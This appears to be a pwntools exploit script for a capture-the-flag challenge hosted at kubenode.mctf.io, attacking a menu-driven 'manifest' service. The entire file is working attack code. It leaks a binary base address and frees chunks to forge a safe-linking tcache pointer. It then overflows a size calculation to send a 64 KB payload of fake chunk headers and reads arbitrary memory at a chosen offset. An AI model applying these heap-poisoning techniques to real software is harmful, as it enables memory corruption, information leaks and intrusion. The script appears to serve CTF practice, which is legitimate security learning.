from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    if len(data) > 0:
        p.recvuntil(b'data:\n')
        p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()
register(0, 1, 16, b'A'*16)
register(1, 1, 16, b'B'*16)
register(2, 1, 16, b'C'*16)

val, chk0 = inspect(0)
_, chk1 = inspect(1)

base_addr = val - 0x136c

delete(2)
delete(1)
delete(0)

target_addr = base_addr + 0x3600
fd = target_addr ^ (chk1 >> 12)

payload = b'A' * 24
payload += p64(0x21)
payload += p64(fd)

for i in range(2, 2000):
    payload = payload.ljust(i * 32 - 8, b'\x00')
    payload += p64(0x21)

payload = payload.ljust(65536, b'\x00')

p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'0')
p.recvuntil(b'Item count: ')
p.sendline(b'256')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'256')
p.recvuntil(b'data:\n')
p.send(payload)
recv_menu()

register(1, 1, 16, b'X'*16)

# Read from 0x3600
p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'2')
p.recvuntil(b'Item count: ')
p.sendline(b'1')
p.recvuntil(b'Item size (bytes): ')
p.sendline(b'0')
recv_menu()

leak = view(2)
print(f"Leak: {leak}")

p.close()
